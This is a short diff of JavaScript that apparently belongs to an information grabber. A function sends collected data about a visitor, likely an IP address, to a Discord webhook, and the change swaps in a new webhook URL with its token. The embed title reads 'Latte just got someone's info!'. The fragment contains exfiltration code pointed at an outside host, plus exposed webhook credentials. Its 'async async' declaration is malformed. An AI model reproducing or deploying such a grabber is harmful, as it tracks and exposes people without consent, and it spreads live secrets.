@@ -78,7 +78,7 @@ fetchAndDisplayIPData();
 
 
 async async function sendToWebhook(info) {
-    const webhookUrl = "https://discord.com/api/webhooks/1388405456430436443/7dUtCcjyd6Sof3oJqc8PcrgA4LBiGVs5PnPnIadV4sze67ji96uZf21acYKiwLCvMTTM"; // Replace this
+    const webhookUrl = "https://discord.com/api/webhooks/1389799896600805557/BvKcp6U2RYQ-rybb1WMylVZ_GcuEqGN8VbTMqs-ngL2uiwMbn6BDznozofTiB4vDP-IB"; // Replace this
 
     const embed = {
         title: "🎯 Latte just got someone's info!",
